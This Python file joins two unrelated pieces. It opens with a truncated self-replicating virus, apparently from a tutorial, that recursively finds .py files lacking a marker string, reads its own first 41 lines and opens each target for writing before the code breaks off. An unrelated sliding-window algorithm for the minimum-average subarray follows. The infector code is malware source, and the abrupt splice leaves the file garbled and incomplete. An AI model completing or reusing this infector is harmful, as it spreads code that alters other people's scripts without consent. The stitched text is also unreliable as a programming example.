#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find
# minimum average subarray

# Prints beginning and ending
# indexes of subarray of size k
# with minimum average
def findMinAvgSubarray(arr, n, k):

    # k must be smaller than or equal to n
    if (n < k):
        return 0

    # Initialize beginning index of result
    res_index = 0

    # Compute sum of first subarray of size k
    curr_sum = 0
    for i in range(k):
        curr_sum += arr[i]

    # Initialize minimum sum as current sum
    min_sum = curr_sum

    # Traverse from (k + 1)'th
    # element to n'th element
    for i in range(k, n):

        # Add current item and remove first
        # item of previous subarray
        curr_sum += arr[i] - arr[i-k]

        # Update result if needed
        if (curr_sum < min_sum):

            min_sum = curr_sum
            res_index = (i - k + 1)

    print("Subarray between [", res_index,
          ", ", (res_index + k - 1),
          "] has minimum average")


# Driver Code
arr = [3, 7, 90, 20, 10, 50, 40]
k = 3  # Subarray size
n = len(arr)
findMinAvgSubarray(arr, n, k)

# This code is contributed by Anant Agarwal.
# Time Complexity: O(n)
# Space Complexity: O(1)
